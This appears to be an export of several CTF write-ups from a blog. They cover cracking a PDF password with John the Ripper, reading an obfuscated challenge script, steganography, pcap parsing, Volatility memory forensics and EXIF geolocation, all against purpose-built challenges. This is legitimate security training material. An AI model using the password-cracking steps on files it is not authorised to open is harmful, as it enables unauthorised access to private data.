learn something about himself. He never sure about his identity. Untill One day, he met a sage who gave him a book of truth. The sage said \u0026quot; To understand about yourself,Erase the title and find the Bigger case\u0026quot; Submit the flag on this format ARA2023{} Separate the sentences with _ Attachments Author: Zangetsu#2398\nDiberikan sebuah file pdf berpassword, kita bisa saja membrute-force untuk mendapatkan passwordnya dengan menggunakan tools pdf2john atau John The Ripper\nbash\r$ pdf2john Truth.pdf Truth.pdf:$pdf$4*4*128*-1060*1*16*077e10eba516a741a6285385b42f5b27*32*df507156115f50098c3d8c6fdb1d662200000000000000000000000000000000*32*7a46addd4179a8ab90812ae8876369522d5facc72245be4f28b3559473767d57\rKita simpan hasil hash nya ke dalam sebuah file .hash\nbash\r$ pdf2john Truth.pdf \u0026gt; pdf.hash\rLalu gunakan command john nama_file untuk crack hashnya menggunakan default wordlist dari library nya\nbash\r$ john pdf.hash Using default input encoding: UTF-8 Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64]) No password hashes left to crack (see FAQ)\rSebelumnya kami sudah meng crack dan mendapatkan passwordnya, kita bisa langsung saja menggunakan parameter –-show untuk melihat password yg telah di crack tersimpan\nbash\r$ john --show pdf.hash Truth.pdf:subarukun 1 password hash cracked, 0 left\rPassword untuk membuka file pdfnya yaitu subarukun\nSesuai deskripsi soal yaitu kita diminta untuk mencari Letter yang Uppercase dan menghapus titlenya, didapatlah text yang Uppercase berikut SOUNDSLIKEFANDAGO kemudian pisahkan dengan _\nFlag\rARA2023{SOUNDS_LIKE_FANDAGO}\n","date":"2023-03-05","id":26,"permalink":"/posts/ctfs/2023/ara-ctf-2023/","summary":"https://www.its-ara.com/public/\nTeam\rUDP1P\nusr gochujjang kacang ijooo Challs Category Challenge Forensics Thinker Cryptography One Time Password Cryptography Secret Behind a Letter Cryptography L0v32x0r Cryptography SH4-32 Cryptography babychall Misc Truth Thinker Deskripsi\rI always overthink about finding other part of myself, can you help me?","tags":[],"title":"ARA CTF 2023"},{"content":"https://ctftime.org/event/1877\nCHALL\u0026rsquo;S SOLVED Category Challenge WEB Hi-Score FORENSICS Vastness of Space FORENSICS Random Requests FORENSICS Memory Dump Hi-Score Description :\rReach 100 clicks per second for a reward.\nGiven the website for this challenge http://web.bbctf.fluxus.co.in:1003\nInscpect the JS file, TheScript.js\nTheScript.js\r1(function (_0x52c9b1, _0x4f9b4c) { 2\tvar _0x4fb32a = _0x1a8b, 3\t_0x216299 = _0x52c9b1(); 4\twhile (!![]) { 5\ttry { 6\tvar _0x3f71ce = 7\t(-parseInt(_0x4fb32a(0x1fa)) / 0x1) * 8\t(parseInt(_0x4fb32a(0x1ff)) / 0x2) + 9\tparseInt(_0x4fb32a(0x202)) / 0x3 + 10\t(parseInt(_0x4fb32a(0x201)) / 0x4) * 11\t(parseInt(_0x4fb32a(0x205)) / 0x5) + 12\t(-parseInt(_0x4fb32a(0x1fb)) / 0x6) * 13\t(-parseInt(_0x4fb32a(0x1f7)) / 0x7) + 14\tparseInt(_0x4fb32a(0x206)) / 0x8 + 15\t(-parseInt(_0x4fb32a(0x1f9)) / 0x9) * 16\t(-parseInt(_0x4fb32a(0x203)) / 0xa) + 17\t(parseInt(_0x4fb32a(0x208)) / 0xb) * 18\t(-parseInt(_0x4fb32a(0x1f6)) / 0xc); 19\tif (_0x3f71ce === _0x4f9b4c) break; 20\telse _0x216299[\u0026#34;push\u0026#34;](_0x216299[\u0026#34;shift\u0026#34;]()); 21\t} catch (_0x1d9b38) { 22\t_0x216299[\u0026#34;push\u0026#34;](_0x216299[\u0026#34;shift\u0026#34;]()); 23\t} 24\t} 25})(_0x59a2, 0xa9a43); 26var klicks = 0x0, 27\tscore = 0x0, 28\tstart = new Date()[\u0026#34;getTime\u0026#34;](), 29\tend = 0x0, 30\tend1 = 0x1; 31function _0x1a8b(_0x4264e5, _0x39be1a) { 32\tvar _0x59a27e = _0x59a2(); 33\treturn ( 34\t(_0x1a8b = function (_0x1a8bf4, _0x24b49c) { 35\t_0x1a8bf4 = _0x1a8bf4 - 0x1f4; 36\tvar _0x117e3e = _0x59a27e[_0x1a8bf4]; 37\treturn _0x117e3e; 38\t}), 39\t_0x1a8b(_0x4264e5, _0x39be1a) 40\t); 41} 42function Clicks() { 43\tvar _0x287a2f = _0x1a8b; 44\tif (klicks == 0x0) end = new Date()[_0x287a2f(0x1f5)](); 45\t(end1 = new Date()[_0x287a2f(0x1f5)]() - end), 46\t(klicks += 0x1), 47\t(score = (klicks / end1) * 0x3e8); 48\tif (score == Infinity) score = 0x0; 49\t(score = score[_0x287a2f(0x204)](0x3)), 50\t(document[_0x287a2f(0x1f4)](_0x287a2f(0x1fd))[\u0026#34;innerHTML\u0026#34;] = 51\t_0x287a2f(0x207) + score + _0x287a2f(0x1fc)); 52\tif (score \u0026gt;= 0x64) _0x125e1a(); 53\telse document[\u0026#34;getElementById\u0026#34;](_0x287a2f(0x1f8))[_0x287a2f(0x200)] = \u0026#34;\u0026#34;; 54\tfunction _0x125e1a() { 55\tvar _0x162e81 = _0x287a2f; 56\tdocument[\u0026#34;getElementById\u0026#34;](_0x162e81(0x1f8))[_0x162e81(0x200)] = 57\t_0x162e81(0x1fe); 58\t} 59} 60function Reset() { 61\t(klicks = 0x0), 62\t(score = 0x0), 63\t(start = new Date()[\u0026#34;getTime\u0026#34;]()), 64\t(end = 0x0), 65\t(end1 = 0x1), 66\tClicks(); 67} 68function _0x59a2() { 69\tvar _0x78411b = [ 70\t\u0026#34;\\x20cps\u0026#34;, 71\t\u0026#34;clicks\u0026#34;, 72\t\u0026#34;\\x20Your\\x20Reward\\x20:\\x20\u0026lt;a\\x20href=\\x22\u0026#34; + 73\t\u0026#34;2f2e736563726574696f6e2f666c6167\u0026#34; 74\t.match(/[\\da-f]{2}/gi) 75\t.map((h) =\u0026gt; String.fromCharCode(parseInt(h, 16))) 76\t.join(\u0026#34;\u0026#34;) + 77\t\u0026#34;\\x22\\x20download=\\x22flag\\x22\u0026gt;Reward\u0026lt;/a\u0026gt;\u0026#34;, 78\t\u0026#34;3526ccMajJ\u0026#34;, 79\t\u0026#34;innerHTML\u0026#34;, 80\t\u0026#34;4263236HVNRoh\u0026#34;, 81\t\u0026#34;3656895VkgrIX\u0026#34;, 82\t\u0026#34;503210VEeXpc\u0026#34;, 83\t\u0026#34;toFixed\u0026#34;, 84\t\u0026#34;5NfzyuJ\u0026#34;, 85\t\u0026#34;8399912tBbEFu\u0026#34;, 86\t\u0026#34;SCORE:\\x20\u0026#34;, 87\t\u0026#34;6379703kdfIqT\u0026#34;, 88\t\u0026#34;getElementById\u0026#34;, 89\t\u0026#34;getTime\u0026#34;, 90\t\u0026#34;48bKPhCj\u0026#34;, 91\t\u0026#34;14Xmxuhh\u0026#34;, 92\t\u0026#34;reward\u0026#34;, 93\t\u0026#34;9wOTYQU\u0026#34;, 94\t\u0026#34;597OMUzhx\u0026#34;, 95\t\u0026#34;2046510XnQiaG\u0026#34;, 96\t]; 97\t_0x59a2 = function () { 98\treturn _0x78411b; 99\t}; 100\treturn _0x59a2(); 101}\rInside the _0x59a2() function that has a array value in hexadecimal in 2f2e736563726574696f6e2f666c6167, decode that bash\r$ python3 \u0026gt;\u0026gt;\u0026gt; hexstring = \u0026#39;2f2e736563726574696f6e2f666c6167\u0026#39; \u0026gt;\u0026gt;\u0026gt; result = bytes.fromhex(hexstring).decode(\u0026#39;utf-8\u0026#39;) \u0026gt;\u0026gt;\u0026gt; print(result) /.secretion/flag \u0026gt;\u0026gt;\u0026gt;\rThe result is /.secretion/flag, go to the webpage http://web.bbctf.fluxus.co.in:1003/.secretion/flag\nGot the flag inside flag file,\nFLAG :\rflag{THAtS_15_A_SM4rT_m0ve}\nVastness of Space Description :\rIs space really that empty? Empty_Space.jpg\nGiven the image file Empty_Space.jpg first You can get the password by checking the metadata by using Exiftool\nbash\r$ exiftool Empty_Space.jpg\rhere\u0026rsquo;s the password xp_comment: The password is \u0026quot;BBCTF\u0026quot;\nUse steghide to extract the embedded text file and enter passphrase as the password you got from exifdata\nbash\r$ steghide extract -sf Empty_Space.jpg\rGot the somedata.txt then make a script to convert those numbers from somedata.txt into an image, here\u0026rsquo;s the python3 script that I\u0026rsquo;ve coded\nsolver.py\r1from PIL import Image 2 3width = None 4height = None 5data = [] 6with open(\u0026#34;somedata.txt\u0026#34;) as f: 7 for line in f: 8 x, y = map(int, line.split(\u0026#34;,\u0026#34;)) 9 data.append((x, y)) 10 if width is None or x \u0026gt; width: 11 width = x 12 if height is None or y \u0026gt; height: 13 height = y 14 15width += 20 16height += 20 17image = Image.new(\u0026#34;RGB\u0026#34;, (width, height), (255, 255, 255)) 18pixels = image.load() 19 20for point in data: 21 pixels[point[0]+5, point[1]+5] = (0, 0, 0) 22 23image = image.resize((500,500), Image.NEAREST) 24image.save(\u0026#34;output.png\u0026#34;)\rGot the result in qr code output.png then scan it\nFLAG :\rflag{qUiCk_R3sP0nse_c0d3}\nRandom Requests Description :\rI captured these very random http requests. Can you help me decode them? random_requests.pcapng\nUsing the protocol layer statistics to understand the types of recorded packets and looking at them in various ways, you can see http \u0026amp;\u0026amp; ip.src_host == 142.250.67.132 characteristic requests. GET /flag=0 or 1 or %20 is recorded after.\nIf you take them all in chronological order and change %20 to a line break instead of a blank, it looks like the base64 encoded in 8 byte binary representation.\nbash\r$ python3 \u0026gt;\u0026gt;\u0026gt; chr(int(\u0026#39;01011010\u0026#39;, 2)) \u0026#39;Z\u0026#39; \u0026gt;\u0026gt;\u0026gt; chr(int(\u0026#39;01101101\u0026#39;, 2)) \u0026#39;m\u0026#39; \u0026gt;\u0026gt;\u0026gt; chr(int(\u0026#39;01111000\u0026#39;, 2)) \u0026#39;x\u0026#39;\rWe need to extract that binary representated with this script, then save into file text\nextract.py\r1#!/usr/bin/env python3 2from scapy.all import * 3from base64 import * 4 5packets = rdpcap(\u0026#34;random_requests.pcapng\u0026#34;) 6 7binary_output = \u0026#34;\u0026#34; 8 9for packet in packets: 10 if packet[IP].dst == \u0026#34;142.250.67.132\u0026#34; and packet.haslayer(Raw): 11 binary_output += packet[Raw].load.split(b\u0026#34; \u0026#34;)[1].decode().split(\u0026#34;=\u0026#34;)[1] 12 13output = binary_output.replace(\u0026#34;%20\u0026#34;, \u0026#34; \u0026#34;) 14 15with open(\u0026#34;output.txt\u0026#34;, \u0026#34;w\u0026#34;) as file: 16 file.write(output)\rConvert with CyberChef. If you use CyberChef\u0026rsquo;s Magic roughly it\u0026rsquo;s base64 , so if you add it a flag will appear. From Binary \u0026amp; From Base64, ZmxhZ3tuT1RfU29fcjRuZG9tX2g3N3BfcjNxdTM1dHN9\nbash\r$ echo \u0026#39;ZmxhZ3tuT1RfU29fcjRuZG9tX2g3N3BfcjNxdTM1dHN9\u0026#39; | base64 -d flag{nOT_So_r4ndom_h77p_r3qu35ts}\rFLAG :\rflag{nOT_So_r4ndom_h77p_r3qu35ts}\nMemory Dump Description :\rI was learning powershell when my pc suddenly crashed. Can you retrieve my bash history? Download link\nGiven an memory image file named Memdump.raw, at the first i was using Volatility 2 but when I check the imageinfo to retrieve profile the suggested profile cannot appeared,\nThen I switch to Volatility 3, this memory image file can be able to analyze using Volatility 3\nNow check with windows.info to get an information of memory file\nbash\r$ vol -f Memdump.raw windows.info Volatility 3 Framework 2.4.1 Progress: 100.00 PDB scanning finished Variable Value Kernel Base 0xf8025ea03000 DTB 0x1aa000 Symbols file:///home/nopedawn/.local/lib/python3.10/site-packages/volatility3/symbols/windows/ntkrnlmp.pdb/68A17FAF3012B7846079AEECDBE0A583-1.json.xz Is64Bit True IsPAE False layer_name 0 WindowsIntel32e memory_layer 1 FileLayer KdVersionBlock 0xf8025f612398 Major/Minor 15.19041 MachineType 34404 KeNumberProcessors 1 SystemTime 2022-12-16 10:41:11 NtSystemRoot C:\\Windows NtProductType NtProductWinNt NtMajorVersion 10 NtMinorVersion 0 PE MajorOperatingSystemVersion 10 PE MinorOperatingSystemVersion 0 PE Machine 34404 PE TimeDateStamp Wed Jun 28 04:14:26 1995\rTo get an information process tree of Powershell\nbash\r$ vol -f Memdump.raw windows.pstree *** 1324 2104 powershell.exe 0xc88f237da080 9 - 1 False 2022-12-16 10:36:27.000000 N/A\rAccording to the description of the challenge to find commands executed in Powershell. After some googling, found that the powershell history is stored in a .txt file, which specifically in ConsoleHost_history.txt\nbash\r$ vol -f Memdump.raw windows.filescan | grep \u0026#34;ConsoleHost_history.txt\u0026#34; 0xc88f21961af0.0\\Users\\bbctf\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 216\rAfter we get the Offset (virtaddr), we can retrieve the ConsoleHost_history.txt file with windows.dumpfiles\nbash\r$ vol -f Memdump.raw windows.dumpfiles --pid 1324 --virtaddr 0xc88f21961af0 Volatility 3 Framework 2.4.1 Progress: 100.00 PDB scanning finished Cache FileObject FileName Result DataSectionObject 0xc88f21961af0 ConsoleHost_history.txt file.0xc88f21961af0.0xc88f1e9b5570.DataSectionObject.ConsoleHost_history.txt.dat\rAfter extracting, rename the file to make it easier to read, then cat the file\nbash\r$ mv file.0xc88f21961af0.0xc88f1e9b5570.DataSectionObject.ConsoleHost_history.txt.dat ConsoleHost_history.txt $ cat ConsoleHost_history.txt $xorkey = bbctf $xorkey = \u0026#34;bbctf\u0026#34; $aescipherkey = \u0026#34;ByteBandits-CTF Jan 2023\u0026#34; $encrypted_flag = \u0026#34;m74/XKCNkHmzJHEPAOHvegV96AOubRnSUQBpJnG4tHg=\u0026#34;\rWe must decode the encrypted flag using base64 and then decrypt it using AES ECB mode with the AES cipher key. To obtain the flag we can use CyberChef, and here\u0026rsquo;s the result\nFLAG :\rflag{V0L@tiLiTy_4_da_w1N}\nCHALL\u0026rsquo;S UNSOLVED Category Challenge FORENSICS ImageCeption ImageCeption Description :\r\u0026ldquo;The painter has the universe in his mind and hands.\u0026rdquo; -Leonardo Da Vinci Download link\nGiven the memory image of named imageception.raw, and I will use Volatility 3 to analysis memory image,\nWe check the image info with windows.info first, it looks like a Windows 10 memory dump.\nbash\r$ vol -f imageception.raw windows.info Volatility 3 Framework 2.4.1 Progress: 100.00 PDB scanning finished Variable Value Kernel Base 0xf80778a18000 DTB 0x1aa000 Symbols file:///home/nopedawn/.local/lib/python3.10/site-packages/volatility3/symbols/windows/ntkrnlmp.pdb/68A17FAF3012B7846079AEECDBE0A583-1.json.xz Is64Bit True IsPAE False layer_name 0 WindowsIntel32e memory_layer 1 FileLayer KdVersionBlock 0xf80779627398 Major/Minor 15.19041 MachineType 34404 KeNumberProcessors 1 SystemTime 2022-12-16 08:28:29 NtSystemRoot C:\\Windows NtProductType NtProductWinNt NtMajorVersion 10 NtMinorVersion 0 PE MajorOperatingSystemVersion 10 PE MinorOperatingSystemVersion 0 PE Machine 34404 PE TimeDateStamp Wed Jun 28 04:14:26 1995\rIf we take a look windows.pstree there\u0026rsquo;s a process mspaint.exe are running, by the challenge description let\u0026rsquo;s just check that process\nbash\r$ vol -f imageception.raw windows.pstree Volatility 3 Framework 2.4.1 Progress: 100.00 PDB scanning finished PID PPID ImageFileName Offset(V) Threads Handles SessionId Wow64 CreateTime ExitTime *** 4448 3044 mspaint.exe 0xa08f6e45b080 8 - 1 False 2022-12-16 08:27:45.000000 N/A\rThen I run windows.cmdline to check lists process command line arguments. And there\u0026rsquo;s an imageception.png is opened with mspaint.exe process\nbash\r$ vol -f imageception.raw windows.cmdline`, Volatility 3 Framework 2.4.1 Progress: 100.00 PDB scanning finished PID Process Args 4448 mspaint.exe \u0026#34;C:\\Windows\\system32\\mspaint.exe\u0026#34; \u0026#34;C:\\Users\\bbctf\\Desktop\\imageception.png\u0026#34;\rCatch the Offset (virtaddr) to retrive that imageception.png file with windows.filescan to scans for file objects present in a particular windows memory image.\nbash\r$ vol -f imageception.raw windows.filescan | grep png 0xa08f6ca23200.0\\Users\\bbctf\\Desktop\\imageception.png 216\rGot the Offset (virtaddr) 0xa08f6ca23200 of imageception.png now dump the file\nbash\r$ vol -f imageception.raw windows.dumpfiles --pid 4448 --virtaddr 0xa08f6ca23200 Volatility 3 Framework 2.4.1 Progress: 100.00 PDB scanning finished Cache FileObject FileName Result DataSectionObject 0xa08f6ca23200 imageception.png Error dumping file\rGot the dump result in .dat file just change into .png extension, and we got the flag imageception.png\nbash\r$ mv file.0xa08f6ca23200.0xa08f6c9d1350.DataSectionObject.imageception.png.dat imageception.png\rFLAG :\rflag{!m@g3_w1tHin_1M4ge}\n","date":"2023-02-15","id":27,"permalink":"/posts/ctfs/2023/bytebandits-ctf-2023/","summary":"https://ctftime.org/event/1877\nCHALL\u0026rsquo;S SOLVED Category Challenge WEB Hi-Score FORENSICS Vastness of Space FORENSICS Random Requests FORENSICS Memory Dump Hi-Score Description :\rReach 100 clicks per second for a reward.","tags":[],"title":"ByteBandits CTF 2023"},{"content":"https://ctftime.org/event/1732\nCHALL\u0026rsquo;S SOLVED Category Challenge CRYPTOGRAPHY one-more-time-pad WEB college-tour REVERSING string-cheese MISC CATS! one-more-time-pad Description\rI heard the onetime pad is perfectly secure so I used it to send an important message to a friend, but now a UCLA competition is asking for the key? I threw that out a long time ago! Can you help me recover it? chall.py\nThis cryptographic challenge is to encrypt a plain text Long ago, the four nations lived together in harmony ...\nThen XOR it with hexadecimal key 200e0d13461a055b4e592b0054543902462d1000042b045f1c407f18581b56194c150c13030f0a5110593606111c3e1f5e305e174571431e\nHere\u0026rsquo;s a solver script\nsolver.py\r1plaintext = b\u0026#34;Long ago, the four nations lived together in harmony ...\u0026#34; 2ciphertext = bytes.fromhex(\u0026#34;200e0d13461a055b4e592b0054543902462d1000042b045f1c407f18581b56194c150c13030f0a5110593606111c3e1f5e305e174571431e\u0026#34;) 3 4assert len(plaintext) == len(ciphertext) 5 6for (x,z) in zip(ciphertext,plaintext): 7 if chr(x^z) == \u0026#34;}\u0026#34; : 8 print(chr(x^z)) 9 break 10 else: 11 print(chr(x^z), end=\u0026#34;\u0026#34;)\rAnd this another solver using CyberChef\nFLAG\rlactf{b4by_h1t_m3_0ne_m0r3_t1m3}\ncollege-tour Description\rWelcome to UCLA! To explore the #1 public college, we have prepared a scavenger hunt for you to walk all around the beautiful campus. college-tour.lac.tf\nJust inspect the sourcecode file on html, css, js then you get 6 part of the flag\nOn html sourcecode\npart-1 j03_4 part-2 nd_j0 part-4 n3_bR index\r1\u0026lt;!DOCTYPE html\u0026gt; 2\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; 3 \u0026lt;head\u0026gt; 4 \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;/\u0026gt; 5 \u0026lt;title\u0026gt;A tour of UCLA\u0026lt;/title\u0026gt; 6 \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;index.css\u0026#34;\u0026gt; 7 \u0026lt;script src=\u0026#34;script.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 8 \u0026lt;/head\u0026gt; 9 \u0026lt;body\u0026gt; 10 \u0026lt;h1\u0026gt;A tour of UCLA\u0026lt;/h1\u0026gt; 11 \u0026lt;button id=\u0026#34;dark_mode_button\u0026#34; onclick=\u0026#34;dark_mode()\u0026#34;\u0026gt;Click me for Light Mode!\u0026lt;/button\u0026gt; 12 \u0026lt;p\u0026gt; 13 After finally setting foot on UCLA\u0026#39;s campus, you\u0026#39;re excited to explore it. However, the new student advisors have hidden \u0026lt;b\u0026gt;six\u0026lt;/b\u0026gt; 14 clues in the format lactf{number_text} all across UCLA. To complete the scavenger hunt, you must merge all the parts into one in order. For example, if you find the clues lactf{1_lOsT}, lactf{2__!N_b} (note the repeated underscore), and lactf{3_03LT3r}, the answer is lactf{lOsT_!N_b03LT3r}. Have fun exploring! 15 \u0026lt;/p\u0026gt; 16 \u0026lt;!-- lactf{1_j03_4}--\u0026gt; 17 \u0026lt;img src=\u0026#34;royce.jpg\u0026#34; alt=\u0026#34;lactf{2_nd_j0}\u0026#34; height=\u0026#34;400px\u0026#34;\u0026gt; 18 \u0026lt;iframe src=\u0026#34;lactf{4_n3_bR}.pdf\u0026#34; width=\u0026#34;100%\u0026#34; height=\u0026#34;500px\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; 19 \u0026lt;/body\u0026gt;\rOn css sourcecode\npart-3 S3phI css\r.secret { font-family: \u0026#34;lactf{3_S3phI}\u0026#34; }\rAnd js sourcecode\npart-5 U1n_s part-6 AY_hi js\rfunction dark_mode() { dark = 1 - dark; var element = document.body; element.classList.toggle(\u0026#34;dark-mode\u0026#34;); if (dark === 1) { document.getElementById(\u0026#34;dark_mode_button\u0026#34;).textContent = \u0026#34;Click me for Light Mode!\u0026#34;; } else if (dark === 0) { document.getElementById(\u0026#34;dark_mode_button\u0026#34;).textContent = \u0026#34;Click me for Dark Mode!\u0026#34;; } else { document.getElementById(\u0026#34;dark_mode_button\u0026#34;).textContent = \u0026#34;Click me for lactf{6_AY_hi} Mode!\u0026#34;; } } window.addEventListener(\u0026#34;load\u0026#34;, (event) =\u0026gt; { document.cookie = \u0026#34;cookie=lactf{5_U1n_s}\u0026#34;; });\rFLAG\rlactf{j03_4nd_j0S3phIn3_bRU1n_sAY_hi}\nstring-cheese Description\rI\u0026rsquo;m something of a cheese connoisseur myself. If you can guess my favorite flavor of string cheese, I\u0026rsquo;ll even give you a flag. Of course, since I\u0026rsquo;m lazy and socially inept, I slapped together a program to do the verification for me.\nConnect to my service at nc lac.tf 31131\nNote: The attached binary is the exact same as the one executing on the remote server. string_cheese\nWhen the program is run it will ask for a password, by the challenge name it\u0026rsquo;s string then we can check that there is a string stored in the program\nI\u0026rsquo;m using IDA Disassembler to analyze the given binary-elf file, and get the string value blueberry to answering that\u0026rsquo;s input statement, or you can just use strings command\nbash\r$ nc lac.tf 31131 What\u0026#39;s my favorite flavor of string cheese? blueberry ...how did you know? That isn\u0026#39;t even a real flavor... Well I guess I should give you the flag now... lactf{d0n7_m4k3_fun_0f_my_t4st3_1n_ch33s3}\rFLAG\rlactf{d0n7_m4k3_fun_0f_my_t4st3_1n_ch33s3}\nCATS! Description\rCATS OMG I CAN\u0026rsquo;T BELIEVE HOW MANY CATS ARE IN THIS IMAGE I NEED TO VISIT CAN YOU FIGURE OUT THE NAME OF THIS CAT HEAVEN? Answer is the domain of the website for this location. For example, if the answer was ucla, the flag would be lactf{ucla.edu}. CATS.jpeg\nCheck the metadata file using Exiftool and got the bunch of information, we\u0026rsquo;re dominant to Location : Lanai Cat Sanctuary\nbash\r$ exiftool CATS.jpeg ExifTool Version Number : 12.40 File Name : CATS.jpeg Directory : . File Size : 4.7 MiB File Modification Date/Time : 2023:02:11 11:05:45+07:00 File Access Date/Time : 2023:02:16 05:57:29+07:00 File Inode Change Date/Time : 2023:02:11 11:05:45+07:00 File Permissions : -rwxrwxrwx File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg Exif Byte Order : Big-endian (Motorola, MM) Make : Apple Camera Model Name : iPhone SE (2nd generation) Orientation : Rotate 90 CW X Resolution : 72 Y Resolution : 72 Resolution Unit : inches Software : 15.5 Modify Date : 2022:06:17 12:52:05 Host Computer : iPhone SE (2nd generation) Y Cb Cr Positioning : Centered Exposure Time : 1/144 F Number : 1.8 Exposure Program : Program AE ISO : 20 Exif Version : 0232 Date/Time Original : 2022:06:17 12:52:05 Create Date : 2022:06:17 12:52:05 Offset Time : -10:00 Offset Time Original : -10:00 Offset Time Digitized : -10:00 Components Configuration : Y, Cb, Cr, - Shutter Speed Value : 1/144 Aperture Value : 1.8 Brightness Value : 6.672492018 Exposure Compensation : 0 Metering Mode : Multi-segment Flash : Off, Did not fire Focal Length : 4.0 mm Subject Area : 2013 1511 2217 1330 Run Time Flags : Valid Run Time Value : 526663128177750 Run Time Scale : 1000000000 Run Time Epoch : 0 Acceleration Vector : -0.06026777624 -0.8702277539 -0.4827761948 Sub Sec Time Original : 057 Sub Sec Time Digitized : 057 Flashpix Version : 0100 Color Space : Uncalibrated Exif Image Width : 4032 Exif Image Height : 3024 Sensing Method : One-chip color area Scene Type : Directly photographed Exposure Mode : Auto White Balance : Auto Focal Length In 35mm Format : 28 mm Scene Capture Type : Standard Lens Info : 3.99000001mm f/1.8 Lens Make : Apple Lens Model : iPhone SE (2nd generation) back camera 3.99mm f/1.8 Composite Image : General Composite Image GPS Version ID : 2.3.0.0 GPS Map Datum : WGS-84 Compression : JPEG (old-style) Thumbnail Offset : 2478 Thumbnail Length : 11136 Current IPTC Digest : 50350e5c967628d3532b5317912bff65 Coded Character Set : UTF8 Envelope Record Version : 4 Sub-location : Lanai Cat Sanctuary Province-State : HI Country-Primary Location Code : US Country-Primary Location Name : United States Application Record Version : 4 XMP Toolkit : Image::ExifTool 12.42 Country Code : US Location : Lanai Cat Sanctuary Location Created City : Lanai City Location Created Country Code : US Location Created Country Name : United States Location Created Province State : HI Location Created Sublocation : Lanai Cat Sanctuary City : Lanai City Country : United States State : HI Metadata Date : 2023:02:09 15:48:44-08:00 Profile CMM Type : Apple Computer Inc. Profile Version : 4.0.0 Profile Class : Display Device Profile Color Space Data : RGB Profile Connection Space : XYZ Profile Date Time : 2022:01:01 00:00:00 Profile File Signature : acsp Primary Platform : Apple Computer Inc. CMM Flags : Not Embedded, Independent Device Manufacturer : Apple Computer Inc. Device Model : Device Attributes : Reflective, Glossy, Positive, Color Rendering Intent : Perceptual Connection Space Illuminant : 0.9642 1 0.82491 Profile Creator : Apple Computer Inc. Profile ID : ecfda38e388547c36db4bd4f7ada182f Profile Description : Display P3 Profile Copyright : Copyright Apple Inc., 2022 Media White Point : 0.96419 1 0.82489 Red Matrix Column : 0.51512 0.2412 -0.00105 Green Matrix Column : 0.29198 0.69225 0.04189 Blue Matrix Column : 0.1571 0.06657 0.78407 Red Tone Reproduction Curve : (Binary data 32 bytes, use -b option to extract) Chromatic Adaptation : 1.04788 0.02292 -0.0502 0.02959 0.99048 -0.01706 -0.00923 0.01508 0.75168 Blue Tone Reproduction Curve : (Binary data 32 bytes, use -b option to extract) Green Tone Reproduction Curve : (Binary data 32 bytes, use -b option to extract) Image Width : 4032 Image Height : 3024 Encoding Process : Baseline DCT, Huffman coding Bits Per Sample : 8 Color Components : 3 Y Cb Cr Sub Sampling : YCbCr4:2:0 (2 2) Run Time Since Power Up : 6 days 2:17:43 Aperture : 1.8 Image Size : 4032x3024 Megapixels : 12.2 Scale Factor To 35 mm Equivalent: 7.0 Shutter Speed : 1/144 Create Date : 2022:06:17 12:52:05.057-10:00 Date/Time Original : 2022:06:17 12:52:05.057-10:00 Modify Date : 2022:06:17 12:52:05-10:00 Thumbnail Image : (Binary data 11136 bytes, use -b option to extract) GPS Latitude : 20 deg 47\u0026#39; 27.52\u0026#34; N GPS Longitude : 156 deg 57\u0026#39; 50.03\u0026#34; W GPS Latitude Ref : North GPS Longitude Ref : West Circle Of Confusion : 0.004 mm Field Of View : 65.5 deg Focal Length : 4.0 mm (35 mm equivalent: 28.0 mm) GPS Position : 20 deg 47\u0026#39; 27.52\u0026#34; N, 156 deg 57\u0026#39; 50.03\u0026#34; W Hyperfocal Distance : 2.07 m Light Value : 11.2 Lens ID : iPhone SE (2nd generation) back camera 3.99mm f/1.8\rThen you can just googling it, got the domain for a flag is lanaicatsanctuary.org\nFLAG\rlactf{lanaicatsanctuary.org}\nCHALL\u0026rsquo;S UNSOLVED Category Challenge MISC ebe CRYPTOGRAPHY rolling-in-the-mud PWN gatekeep ebe Description\rI was trying to send a flag to my friend over UDP, one character at a time, but it got corrupted! I think someone else was messing around with me and sent extra bytes, though it seems like they actually abided by RFC 3514 for once. Can you get the flag? EBE.pcap\nGiven the packet capture file we can use wireshark to analyze it\nAfter we check the Statistics \u0026gt; Protocol Hierarchy it just show UDP packet and that has 1 byte of each packet bytes\nNow check the UDP Stream Right Click on 1 packet \u0026gt; Follow \u0026gt; UDP Stream, and we got this some string\nLpy5lUKeaVcg3XTtQVftv{Vx_wk4T7ZMKLaaydWM3AO6R8V_1gvLuT6fqeuvxb_sd8ZnqNGSMSu8T8}JDeO8wXQU1ZeJ7_pZE3gCWx}MhJMf1YWVra}SDW8_PBUhXlgYJKcTN767REmwM6wtO4Z6R7QPiV9qJ7In_1UAC45V0wNv6OW{_hDnyXV}lS4w04_m7HQcqt2ZvfcV3qFAd1iWo_LMWQOvE1NOd_HqnZf2uXF9gfEkY51DVcUDQuNduX4RP{J30}czrL8U0s9PuNgF0}0j5063aA4mLdSFm7e08j4c7gUqZb4}\rBy the challenge descripttion that gives some hint RFC 3514. After some googling stuff, those are known as Evil Bit - The Security Flag in the IPv4 Header\nThe bit field is laid out as follows:\r0\r+-+\r|E|\r+-+\rCurrently-assigned values are defined as follows:\r0x0 If the bit is set to 0, the packet has no evil intent. Hosts,\rnetwork elements, etc., SHOULD assume that the packet is\rharmless, and SHOULD NOT take any defensive measures. (We note\rthat this part of the spec is already implemented by many common\rdesktop operating systems.)\r0x1 If the bit is set to 1, the packet has evil intent. Secure\rsystems SHOULD try to defend themselves against such packets.\rInsecure systems MAY chose to crash, be penetrated, etc.\rWe can assume that each packet that we have to check does not contain packet 0x01 or 1 bit, and must be 0 bit.. then we can filter packets on wireshark with the following keywords ip.flags.rb != 1 or ip .flags.rb == 0\nThen check every single packet that we have filtered, then assemble it to get the flag\nFLAG\rlactf{3V1L_817_3xf1l7R4710N_4_7H3_W1N_51D43c8000034d0c}\nrolling-in-the-mud Description\ruugh, these pigs in my pen are making a complete mess! They\u0026rsquo;re rolling all over the place! Anyway, can you decode this cipher they gave me, almost throwing it at me while rolling around? Answer in lowercase with symbols. In the image, { and } are characters that should appear in your flag, and replace spaces with _. cipher.png\nWe\u0026rsquo;re given an image, this image looks like the pigpen cipher, but after 